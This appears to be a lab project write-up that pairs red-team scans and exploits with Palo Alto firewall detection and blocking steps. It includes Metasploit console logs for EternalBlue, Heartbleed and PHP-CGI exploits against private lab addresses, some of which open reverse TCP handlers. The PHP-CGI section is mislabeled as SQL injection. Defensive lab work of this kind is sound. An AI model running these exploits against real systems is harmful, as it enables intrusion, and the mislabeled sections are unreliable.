Red Test: Nmap against DMZ and Windows Server

### Set up alert in a Palo Alto firewall for detecting and responding to Nmap scans

**Blue Response**

- **Create a Security Profile**
  - In Objects > Security Profiles > Vulnerability Protection.
  - Add a New Profile named Nmap_Scan_Detection.
  - Added Signature Exceptions for Nmap Detection:
    - Selected multiple Nmap related signatures.
    - Set the Action to Block for each of these signatures.
  - Ensure that logging is enabled for the new security policy rule.
- **Verify and Tested**
  - Checked that Monitor > Logs > Threat to review the alerts generated by Nmap scan detections.
    
[[https://github.com/Reenhaider/2024CyberProject/blob/main/img/Firewall-nmap-alert.PNG|alt=octocat]]
---


## Red Test: Attempt to block access to potentially malicious websites

**Website:** Malicious websites (hacker9.org)

- **Description:** Attempt to access hacker9.org

**Steps to Test:**

1. Update Block Lists: Ensure firewall is using up-to-date threat intelligence feeds and URL categories.
2. Configure URL Filtering: Set up URL filtering rules to block categories like malware, phishing, and suspicious sites.
3. Enable Logging: Make sure logging is enabled for blocked attempts to access malicious sites.
4. Select Test URLs: Choose URLs such as hacker9.org.
5. Perform Tests: Try accessing the selected test URLs from a client within the network.
6. Check Logs: Verify that the access attempts are logged and blocked by your firewall.

**Blue Response**

- **Firewall Configuration**
  - URL Filtering: Configured Palo Alto firewall's URL filtering settings are configured to block access to categories of sites that are considered risky or inappropriate.
  - Threat Prevention: Enable threat prevention features to block known malicious IP addresses and domains.
  - SSL Decryption: Implement SSL decryption to inspect HTTPS traffic for malicious content.

---

## Red Test: Nikto against DMZ Server

**Typical Nikto Scan Activities**

- **Banner Grabbing:**
  - Identifies the version of the web server (Apache) and other software components.
- **Vulnerability Checks:**
  - Scans for known vulnerabilities in the Apache web server, PHP, MySQL, and any web applications running on the server.
  - Looks for outdated software versions with known exploits.
- **Configuration Issues:**
  - Identifies misconfigurations such as directory indexing, enabled HTTP methods (like PUT, DELETE), and default files (e.g., index.php, index.html).
- **Sensitive File Detection:**
  - Searches for sensitive files and directories, such as configuration files (phpinfo.php, .htaccess), backup files (.bak, .old), and temporary files.
- **Common Web Application Vulnerabilities:**
  - Tests for vulnerabilities such as SQL injection, Cross-Site Scripting (XSS), Cross-Site Request Forgery (CSRF), and Local File Inclusion (LFI).
- **SSL/TLS Vulnerabilities:**
  - Checks for weak SSL/TLS configurations and vulnerabilities.

### Set up alert in a Palo Alto firewall for detecting and responding to Nikto scans

**Blue Response**

- **Create a Security Profile**
  - In Objects > Security Profiles > Vulnerability Protection.
  - Add a New Profile named Nikto_Scan_Detection.
  - Added Signature Exceptions for Nikto Detection:
    - Selected any Nikto related signatures.
    - Set the Action to Block for each of these signatures.
  - Ensure that logging is enabled for the new security policy rule.
- **Verify and Tested**
  - Checked that Monitor > Logs > Threat to review the alerts generated by Nmap scan detections.

---

## Red tests using Metasploit CLI and selected payloads

### Eternal Blue

msf6 exploit(windows/smb/ms17_010_eternalblue) > run
[*] Started reverse TCP handler on 192.168.100.200:4444
[*] 192.168.50.100:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[-] 192.168.50.100:445 - Rex::ConnectionRefused: The connection was refused by the remote host (192.168.50.100:445).
[*] 192.168.50.100:445 - Scanned 1 of 1 hosts (100% complete)
[-] 192.168.50.100:445 - The target is not vulnerable.
[*] Exploit completed, but no session was created.

### Heartbleed

msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > back
msf6 > use auxiliary/scanner/ssl/openssl_heartbleed
msf6 auxiliary(scanner/ssl/openssl_heartbleed) > set RHOSTS 192.168.50.100
RHOSTS => 192.168.50.100
msf6 auxiliary(scanner/ssl/openssl_heartbleed) > run
[*] 192.168.50.100:443 - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

### SQL Injection

msf6 exploit(multi/http/php_cgi_arg_injection) > set RHOSTS 192.168.50.100
RHOSTS => 192.168.50.100
msf6 exploit(multi/http/php_cgi_arg_injection) > run
[*] Started reverse TCP handler on 192.168.100.200:4444
[*] Exploit completed, but no session was created.

msf6 exploit(multi/http/php_cgi_arg_injection) >
